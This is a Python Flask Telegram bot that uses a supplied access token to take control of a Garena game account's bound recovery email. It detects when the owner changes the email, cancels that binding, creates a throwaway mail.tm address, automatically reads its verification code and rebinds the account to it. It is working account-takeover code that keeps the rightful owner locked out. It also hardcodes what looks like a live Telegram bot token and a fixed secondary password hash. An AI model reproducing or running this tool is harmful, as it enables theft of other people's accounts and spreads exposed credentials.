```python
from flask import Flask, request
import requests, random, string, re, time

app = Flask(__name__)

BOT_TOKEN = "8061516463:AAFey2ud8QNBFRKLyyVHyLGuGNMz4ThDvQU"
active_monitors = {}

COMMON_HEADERS = {
    'User-Agent': "GarenaMSDK/4.0.19P9(J200F ;Android 7.1.2;ar;EG;)",
    'Connection': "Keep-Alive",
    'Accept-Encoding': "gzip"
}

def send_telegram_message(chat_id, message_text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": message_text}
    try: requests.post(url, data=data)
    except: pass

def remove_email(token):
    url = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
    payload = {'app_id': "100067", 'access_token': token}
    response = requests.post(url, data=payload, headers=COMMON_HEADERS)
    return response.text

def add_email(token, email):
    url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
    payload = {'app_id': '100067', 'access_token': token, 'email': email, 'locale': 'ar_EG'}
    headers = COMMON_HEADERS.copy()
    headers['Accept'] = "application/json"
    response = requests.post(url, data=payload, headers=headers)
    return response.text

def get_current_email(token):
    url = f"https://100067.connect.garena.com/game/account_security/bind:get_bind_info?app_id=100067&access_token={token}"
    response = requests.get(url, headers=COMMON_HEADERS)
    email_match = re.search(r'"email":"([^"]+)"', response.text)
    return email_match.group(1) if email_match else None

def gen_temp_email():
    s = requests.Session()
    domains = s.get("https://api.mail.tm/domains").json()['hydra:member']
    domain = random.choice(domains)['domain']
    user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    passw = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    email = f"{user}@{domain}"
    acc_res = s.post("https://api.mail.tm/accounts", json={"address": email, "password": passw})
    if acc_res.status_code == 201: return email, passw, s
    return None, None, None

def get_verif_codes(email, passw, sess):
    token_res = sess.post("https://api.mail.tm/token", json={"address": email, "password": passw})
    if token_res.status_code != 200: return []
    token = token_res.json()['token']
    headers = {"Authorization": f"Bearer {token}"}
    msgs = sess.get("https://api.mail.tm/messages", headers=headers).json()
    codes = []
    for msg in msgs.get('hydra:member', []):
        text = msg.get('subject', '') + ' ' + msg.get('intro', '')
        codes.extend(re.findall(r'\b\d{4,10}\b', text))
    return codes

def verify_otp(token, email, otp):
    url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
    payload = {'app_id': '100067', 'access_token': token, 'otp': otp, 'email': email}
    response = requests.post(url, data=payload, headers=COMMON_HEADERS)
    return response.text

def create_bind(token, email, verifier_token):
    url = "https://100067.connect.garena.com/game/account_security/bind:create_bind_request"
    payload = {
        'app_id': '100067',
        'access_token': token,
        'verifier_token': verifier_token,
        'secondary_password': "91B4D142823F7D20C5F08DF69122DE43F35F057A988D9619F6D3138485C9A203",
        'email': email
    }
    response = requests.post(url, data=payload, headers=COMMON_HEADERS)
    return response.text

def monitor_process(chat_id, target_email, token):
    current_target = target_email
    
    while active_monitors.get(chat_id):
        try:
            current_email = get_current_email(token)
            
            if current_email != current_target:
                send_telegram_message(chat_id, f"⚠️ تم تغيير الإيميل من {current_target} إلى {current_email}")
                send_telegram_message(chat_id, "🔄 جاري استبدال الإيميل...")
                
                remove_response = remove_email(token)
                send_telegram_message(chat_id, f"🗑️ {remove_response}")
                time.sleep(2)
                
                temp_email, temp_pass, temp_session = gen_temp_email()
                if temp_email:
                    send_telegram_message(chat_id, f"📧 إيميل مؤقت جديد: {temp_email}")
                    
                    add_response = add_email(token, temp_email)
                    send_telegram_message(chat_id, f"📨 {add_response}")
                    
                    if add_response:
                        send_telegram_message(chat_id, "⏳ في انتظار رمز التحقق...")
                        
                        for i in range(60):
                            if not active_monitors.get(chat_id): break
                            codes = get_verif_codes(temp_email, temp_pass, temp_session)
                            if codes:
                                otp = codes[0]
                                send_telegram_message(chat_id, f"🔑 الرمز: {otp}")
                                
                                verify_response = verify_otp(token, temp_email, otp)
                                send_telegram_message(chat_id, f"📨 {verify_response}")
                                
                                if '"verifier_token"' in verify_response:
                                    verifier_match = re.search(r'"verifier_token":"([^"]+)"', verify_response)
                                    if verifier_match:
                                        verifier_token = verifier_match.group(1)
                                        bind_response = create_bind(token, temp_email, verifier_token)
                                        send_telegram_message(chat_id, f"🔗 {bind_response}")
                                        current_target = temp_email
                                        send_telegram_message(chat_id, f"✅ جاري استهداف @{temp_email}")
                                break
                            time.sleep(5)
                        else:
                            send_telegram_message(chat_id, "❌ انتهى وقت الانتظار")
                else:
                    send_telegram_message(chat_id, "❌ فشل إنشاء إيميل")
            else:
                send_telegram_message(chat_id, f"✅ الإيميل المستهدف لا يزال: @{current_target}")
            
            time.sleep(10)
        except Exception as e:
            time.sleep(10)

@app.route('/webhook/telegram', methods=['POST'])
def handle_telegram_webhook():
    data = request.get_json()
    if not data: return "ok", 200
    
    message = data.get('message', {})
    chat_id = message.get('chat', {}).get('id')
    message_text = message.get('text', '')
    
    if not chat_id or not message_text: return "ok", 200
    
    if message_text.startswith('/start'):
        parts = message_text.split()
        if len(parts) > 2:
            target_email = parts[1]
            token = parts[2]
            active_monitors[chat_id] = True
            send_telegram_message(chat_id, f"🚀 بدء المراقبة للإيميل: {target_email}")
            monitor_process(chat_id, target_email, token)
        else:
            send_telegram_message(chat_id, "❌ استخدم: /start email token")
    
    elif message_text == '/stop':
        active_monitors[chat_id] = False
        send_telegram_message(chat_id, "⏹️ توقفت المراقبة")
    
    return "ok", 200

if __name__ == '__main__':
    app.run(debug=True, port=5000)
```
